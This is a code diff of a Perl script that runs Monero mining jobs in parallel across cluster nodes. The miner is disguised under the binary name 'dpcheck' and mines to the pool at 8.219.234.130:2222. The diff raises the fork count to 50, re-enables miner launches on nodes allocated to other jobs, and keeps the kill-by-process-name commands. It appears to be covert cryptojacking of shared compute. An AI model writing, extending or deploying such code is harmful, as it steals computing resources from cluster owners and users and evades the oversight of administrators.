@@ -8,7 +8,7 @@ nohup /home/jsp/cluster/dpcheck --coin=XMR -o 8.219.234.130:2222 \
 use warnings;
 use strict;
 use Parallel::ForkManager;
-my $forkNo = 10;
+my $forkNo = 50;
 my $pm = Parallel::ForkManager->new("$forkNo");
 
 my $miner = "lolminer";# or lolminer
@@ -86,7 +86,7 @@ $pm->start and next;
     if($killjobs eq "yes"){
         print "#Want to kill job\n";
         if($temp){
-            print "****killing job\n";
+            print "killing job\n";
             `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"dpcheck\\\"|awk '{print \\\$2}'|xargs kill -9"`;
         }
         else{
@@ -108,27 +108,27 @@ $pm->start and next;
 # print "killing job\n";
        #     `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"xmrig\\\"|awk '{print \\\$2}'|xargs kill"`;
     if ($state){#ALLOCATED
-        print "***node with ALLOCATED state: $nodename\n";
-       # if($temp_x){#full performance 
+        print "node with ALLOCATED state: $nodename\n";
+        if($temp_x){#full performance 
           #kill first then submit thread job
-          print "killing all jobs\n";
+          print "killing x job\n";
           `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"dpcheck\\\"|awk '{print \\\$2}'|xargs kill"`;
           sleep(1);
-          print "Allocated, kill all jobs. No Submitting t job\n";
-        #    my $pid = fork();
-		#    if ($pid == 0) {exec("$cmd '$mining_t'");}# if($pid == 0);
-       # }#$temp_x true and allocated
-        #elsif(!$temp_x and !$temp_t){#no jobs with ALLOCATED state
-        #    print "Allocated with no jobs. Submitting t job\n";            
-        #    #my $pid = fork();
-		#    #if ($pid == 0) {exec("$cmd '$mining_t'");}# if($pid == 0);
-        #}        
-        #else{ print "job exist for node with ALLOCATED state: $nodename\n"; }
+          print "Allocated, kill x job. Submitting t job\n";
+            my $pid = fork();
+		    if ($pid == 0) {exec("$cmd '$mining_t'");}# if($pid == 0);
+        }#$temp_x true and allocated
+        elsif(!$temp_x and !$temp_t){#no jobs with ALLOCATED state
+            print "Allocated with no jobs. Submitting t job\n";            
+            my $pid = fork();
+		    if ($pid == 0) {exec("$cmd '$mining_t'");}# if($pid == 0);
+        }        
+        else{ print "job exist for node with ALLOCATED state: $nodename\n"; }
     }
     else
     {#not ALLOCATED
         print "*node with No ALLOCATED state: $nodename\n";
-        if($temp_t){# t job exists 
+        if($temp_t){#t job exists 
           #kill t job first then submit x job
           print "killing t job\n";
           `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"dpcheck\\\"|awk '{print \\\$2}'|xargs kill"`;
@@ -142,7 +142,7 @@ $pm->start and next;
             my $pid = fork();
 		    if ($pid == 0) {exec("$cmd '$mining_x'");}# if($pid == 0);
         }
-        else{ print "job exists for node with No ALLOCATED state: $nodename\n"; }
+        else{ print "job exist for node with No ALLOCATED state: $nodename\n"; }
 
     }
        
